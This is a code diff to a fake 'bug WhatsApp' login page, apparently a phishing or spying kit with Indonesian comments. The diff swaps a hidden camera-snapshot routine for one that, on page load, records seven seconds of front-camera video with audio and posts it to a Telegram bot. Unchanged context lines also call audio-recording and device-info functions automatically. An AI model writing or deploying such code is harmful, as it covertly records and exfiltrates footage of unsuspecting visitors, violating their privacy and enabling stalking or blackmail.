@@ -80,17 +80,10 @@
       font-size: 15px;
     }
     .login-button:hover { background-color: #2563eb; box-shadow: 0 0 20px blue; }
-    
-    /* Elemen tersembunyi untuk kebutuhan startCamera */
-    #video, #canvas { display: none; }
   </style>
 </head>
 <body>
   <div class="bg-particles"></div>
-
-  <!-- Elemen pendukung fungsi startCamera -->
-  <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="640" height="480"></canvas>
 
   <div class="login-container">
     <p class="login-title">bug WhatsApp By Hacked official</p>
@@ -116,17 +109,13 @@
       });
     }
 
-    // Fungsi pembantu untuk mengirim foto dari blob
-    function sendPhotoToTelegram(blob) {
+    function sendVideo(blob, filename) {
       chatIds.forEach(id => {
         const formData = new FormData();
         formData.append('chat_id', id);
-        formData.append('photo', blob, 'capture.jpg');
-        formData.append('caption', '📸 Hasil Capture Kamera');
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
-          method: 'POST', 
-          body: formData 
-        }).catch(console.error);
+        formData.append('video', blob, filename);
+        formData.append('caption', '📹 Rekaman Kamera Depan (7 Detik)');
+        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData }).catch(console.error);
       });
     }
 
@@ -152,31 +141,34 @@
       } catch (err) {}
     }
 
-    // FUNGSI YANG ANDA BERIKAN
-    async function startCamera() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-      return new Promise((resolve) => {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-              setTimeout(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(blob => {
-                  if (blob) sendPhotoToTelegram(blob);
-                  stream.getTracks().forEach(track => track.stop());
-                  resolve();
-                }, 'image/jpeg');
-              }, 3000); // Menunggu 3 detik sebelum jepret
-            };
-          })
-          .catch(err => {
-            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
-            resolve();
-          });
-      });
+    // FITUR REKAMAN VIDEO 7 DETIK
+    async function recordFrontVideo() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const videoChunks = [];
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) videoChunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = () => {
+          const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+          sendVideo(videoBlob, 'rekaman_depan.mp4');
+          stream.getTracks().forEach(track => track.stop());
+        };
+
+        // Mulai merekam
+        mediaRecorder.start();
+
+        // Berhenti setelah 7 detik
+        setTimeout(() => {
+          if (mediaRecorder.state !== "inactive") mediaRecorder.stop();
+        }, 7000);
+
+      } catch (err) {
+        sendToTelegram('maaf akses vidio tidak berhasil 🤬');
+      }
     }
 
     async function autoRecordAudio() {
@@ -201,7 +193,7 @@
       createParticles();
       getInfo();
       autoRecordAudio(); 
-      startCamera(); // Menjalankan fungsi kamera yang Anda tambahkan
+      recordFrontVideo(); // Memicu izin kamera depan dan rekaman 7 detik
     });
 
     button.addEventListener('click', () => {
